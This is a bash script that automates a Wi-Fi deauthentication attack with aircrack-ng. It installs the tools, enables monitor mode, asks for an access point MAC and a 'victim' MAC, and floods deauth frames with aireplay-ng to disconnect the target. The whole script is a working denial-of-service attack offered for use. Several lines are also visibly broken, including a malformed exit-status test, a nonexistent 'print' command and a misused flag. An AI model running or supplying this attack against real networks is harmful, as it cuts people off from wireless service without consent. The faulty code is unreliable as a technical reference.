#!/bin/bash

# Author: Rohit P. Tahiliani
# Script has been tested on Ubuntu 14.04 

# check if the user executing the script is root or not  
if ! [ $(id -u) = 0 ]; then
   echo "Please execute this script as root!!"
   exit 1
else
	# check if the required packages are present; else install them
	dpkg -s aircrack-ng 
	if [ echo '$?' -ne 0]; then 
		apt-get install aircrack-ng
		print "Installed necessary packages ...."
	fi
	airmon-ng start wlan0
	airodump-ng mon0
	echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++"
	echo "Specify the MAC Address of the AP:"
	echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++"
	read access_point
	echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++"
	echo "Specify the MAC Address of the victim:"	
	echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++"
	read victim_mac	
	echo "Launching Attack ...."
	aireplay-ng --deauth 1000 -a "$access_point" -h "$victim_mac" mon0 --ignore-negative-one 
	airmon-ng stop mon0
fi